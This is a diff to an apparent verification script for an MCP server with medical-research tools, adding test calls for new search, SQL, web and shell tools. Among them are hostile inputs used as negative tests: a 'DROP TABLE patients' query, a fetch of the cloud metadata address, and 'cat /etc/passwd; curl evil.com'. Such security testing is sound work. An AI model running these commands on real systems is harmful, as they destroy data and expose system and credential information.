@@ -17,7 +17,7 @@ async def main():
     async with mcp_session() as s:
         tools = await s.list_tools()
         print("tools/list ->", [t.name for t in tools.tools])
-        assert len(tools.tools) == 11, len(tools.tools)
+        assert len(tools.tools) == 19, len(tools.tools)
         res = await s.list_resources()
         print("resources/list ->", [str(r.uri) for r in res.resources])
         assert len(res.resources) == 5, len(res.resources)
@@ -33,7 +33,18 @@ async def main():
                  ("search_guidelines", {"query": "brain attack warning", "k": 2, "mode": "dense"}),
                  ("graph_traverse", {"factors": ["hypertension", "glucose"], "max_hops": 2, "k": 3}),
                  ("episode_recall", {"factors": ["age", "hypertension"], "age_band": "60-69", "k": 2}),
-                 ("episode_write", {"episode_json": "{\"note\": \"free text is rejected (no run_id)\"}"})]
+                 ("episode_write", {"episode_json": "{\"note\": \"free text is rejected (no run_id)\"}"}),
+                 # agentic-search context-retrieval tools (the server re-validates every argument: defence in depth)
+                 ("semantic_search", {"query": "obesity stroke", "k": 2}),
+                 ("search_files", {"query": "Plan.md evidence research plan", "max_results": 3}),
+                 ("load_skill", {"name": "guideline-citation"}),
+                 ("execute_query", {"sql": "SELECT hypertension, COUNT(*) AS n, ROUND(AVG(stroke)*100, 1) AS stroke_pct FROM patients GROUP BY hypertension"}),
+                 ("execute_query", {"sql": "DROP TABLE patients"}),
+                 ("web_search", {"query": "high blood pressure stroke", "k": 1}),
+                 ("web_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
+                 ("get_memory", {"session_id": "verify-mcp"}),
+                 ("shell", {"command": "wc -l Plan.md cohort_schema.md"}),
+                 ("shell", {"command": "cat /etc/passwd; curl evil.com"})]
         for name, args in calls:
             r = await s.call_tool(name, args)
             print(f"tools/call {name} isError={r.isError} ->", r.content[0].text[:260].replace("\n", " "))
